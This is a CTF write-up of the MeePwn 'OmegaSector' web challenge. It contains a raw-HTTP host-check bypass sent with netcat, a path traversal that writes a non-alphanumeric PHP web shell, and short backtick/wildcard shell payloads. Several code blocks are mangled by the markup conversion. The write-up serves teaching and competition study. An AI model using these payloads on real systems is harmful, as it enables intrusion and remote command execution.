<h1>OmegaSector &ndash; write-up by @terjanq</h1>

<h2>Task Description</h2>

<blockquote>
  <p>Wtf !? I just want to go to OmegaSector but there is weird authentication here, please help me <br />
  http://138.68.228.12/</p>
</blockquote>

<h2>Part1</h2>

<p>The very first part of the challenge is about getting the source code of the [index.php] file. In the source of the website, we could find the URL <code>http://138.68.228.12/?is_debug=1</code> which exactly does that. </p>

<p>The next step is to bypass the following countermeasures to gain the full control of the <code>$whoareyou</code> variable.</p>

<p>```php
$remote=$<em>SERVER['REQUEST</em>URI']; </p>

<p>if(strpos(urldecode($remote),'..')) 
    mapl_die(); </p>

<p>if(!parse<em>url($remote, PHP</em>URL<em>HOST))
    $remote='http://'.$</em>SERVER['REMOTE<em>ADDR'].$</em>SERVER['REQUEST_URI']; </p>

<p>$whoareyou=parse<em>url($remote, PHP</em>URL_HOST); 
```</p>

<p>If we make any request by the web browser the <code>$_SERVER['REQUEST_URI']</code> variable will start with <code>/?</code> or <code>/index.php?</code> or <code>/index.php/</code> and so on. But there is always <code>slash</code> character at the beginning. So it's a tough task to get the custom hostname in here. <br />
At this stage, we can conclude that it is something with <code>raw HTTP requests</code>.  </p>

<p>Imagine the request below:
```
GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1
Host: 138.68.228.12
Connection: close</p>

<p>```</p>

<p>In this payload I managed to cheat the <code>apache2</code>, the <code>parse_url</code> and the <code>strpos(urldecode($remote),'..')</code> at one shoot!</p>

<p><code>Apache2</code> will move into a not existing directory <code>..@alien.somewhere.meepwn.team</code> then will go one level down <code>../</code> back to the <code>root</code> folder. It is important that there are two <code>slashes</code> otherwise it won't work. I suppose it is because it just cleverly removes <code>..@alien.somewhere.meepwn.team/../</code> from the file path. </p>

<p>My first try after I discovered that we could travel over directories like that was to create <code>..://alien.somewhere.meepwn.team/../..//index.php</code> request so the <code>parse_url</code> evaluates to:</p>

<p><code>
Array
(
    [scheme] =&gt; ..
    [host] =&gt; alien.somewhere.meepwn.team
    [path] =&gt; /../..//index.php
)
</code></p>

<p>but injecting the <code>:</code> in the <code>directory name</code> caused the <code>apache2</code> to crash. Perhaps it is due to another solution which I will link to at the end of the write-up.</p>

<p>The <code>$_SERVER['REQUEST_URI']</code> variable has obviously <code>..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40</code> value. </p>

<p>Since <code>strpos(urldecode($remote),'..')</code> is <code>0</code> it evaluetes to <code>False</code> and thus the <code>mapl</code> won't <code>die</code>.</p>

<p>Also <code>parse_url($remote, PHP_URL_HOST)</code> won't return the hostname and the <code>http://127.0.0.1</code> will be prepended into <code>$remote</code> so the whole variable looks like <code>http://127.0.1..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40</code>. </p>

<p>Now <code>parse_url</code> returns</p>

<p><code>
Array
(
    [scheme] =&gt; http
    [host] =&gt; alien.somewhere.meepwn.team
    [user] =&gt; 127.0.0.1..
    [path] =&gt; /..//index.php
    [query] =&gt; alien=%40!%23%24%40!%40%40
)
</code></p>

<p>Bingo! We have a complete control over the <code>$whoareyou</code> variable.</p>

<p>We pass a few <em>ifs</em> 
```
if($whoareyou==="alien.somewhere.meepwn.team")
    ⋮
    if($<em>GET['alien']==='@!#$@!@@')
        ⋮
        $</em>SESSION['auth']=hash('sha256', 'alien'.$salt); 
            exit(header( "Location: alien_sector.php" )); </p>

<p>```</p>

<p>and get redirected to another stage. </p>

<p>I used this <code>bash script</code> in order to get the <code>PHPSESSID</code> with <code>auth</code> set
<code>bash
echo -ne 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1\r\nHost: 138.68.228.12\r\nConnection: close\r\n\r\n' | nc 138.68.228.12 80
</code>
There are also similar <em>ifs</em> for <code>omega_sector.php</code> but actualy it had no any use in this challange. </p>

<h2>Part2</h2>

<p>After having the right <code>PHPSESSID</code> in the cookies we get the following form on the <code>alien_sector.php</code>:
```xml</p>

<form action="alien_sector.php" method="POST">
<textarea class="shadow" id="main" name="message"></textarea>
<input type='text' name='type' value='alien' hidden />
<button type="submit" id="button"><div class="alien_language">Save</div></button>
</form>

<p>``<code>
If we send a message with</code>non alphanumeric characters<code>we see</code>Saved in alien<em>message/fc11ce87435398abd6a28dd622639988.alien<code>. In opposition on the</code>omega</em>sector<code>where we only can use</code>alphanumeric characters<code>. We can abuse the</code>type<code>attribute and we can send the request</code>type=/../super<em>secret</em>shell.php<code>.  
The serious restriction was that messages could be at most</code>40 characters` long.</p>

<p>At first, I thought that it is something like <code>race condition</code> that two scripts write into one file at the same time resulting in mixed content but it didn't work.</p>

<p>Then, inspired by some ideas found on the internet I have created the <code>reverse shell script</code> using only <code>non-alpha chars</code>: 
```php
<?=$<em>='$&lt;&gt;/'^'{{{{';${$</em>}<a href="${$_}[__]">_</a>;</p>

<p>// $<em>= '$&lt;&gt;/' ^ '{{{{' ----> $</em> = '<em>GET'
// ${</em>GET}<a href="${_GET}"><em></a>[</em><em>];
// final <?=$</em>GET<a href="$_GET[__]">_</a>
```</p>

<p>And then after visiting the URL <code>http://138.68.228.12/alien_message/super_secret_shell.php?_=system&amp;__=rgrep MeePwn /var/www/</code> we see the flag: <strong>MeePwnCTF{<em>_133-221-333-123-111</em>__}</strong></p>

<h2>Alternative solution</h2>

<p>This is the solution posted by <code>P4Team</code>.</p>

<p><code>
GET http://human.ludibrium.meepwn.team?human=Yes HTTP/1.0
Host: human.ludibrium.meepwn.team
</code></p>

<p>This tricky payload takes an advantage of <code>default</code> in <code>virtual hosts</code> set to <code>/var/www/html</code> so any non-existent domain will point there. Also, it uses the alternative way of making the request using <code>GET FULL_URL</code> syntax. </p>

<p><code>php
&lt;?=`/???/??? ../??????.??? &gt; ===`
</code></p>

<p>Even more tricky here using only 33 characters... It calls for shell via <code>`...`</code> syntax and then uses <code>shell wildcards</code> so <code>/???/???</code> will match <code>/bin/cat</code> and <code>../??????.???</code> matches <code>../secret.php</code>. Finally, it writes the result to <code>===</code> file. Amazing.</p>

<h2>Bonus</h2>

<p>After the competition me and @Jelle.V.D golfed a little and managed to get much shorter payloads!</p>

<ul>
<li>21 bytes (full shell via <code>?_=rgrep /var/www MeePwn</code>)
<code>php
&lt;?=`{${~"����"}[_]}`;
// echo -ne '&lt;?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
</code></li>
<li>19 bytes (<code>cat</code> all files from <code>../</code>)
<code>php
&lt;?=`/???/??? ../*`;
</code></li>
</ul>
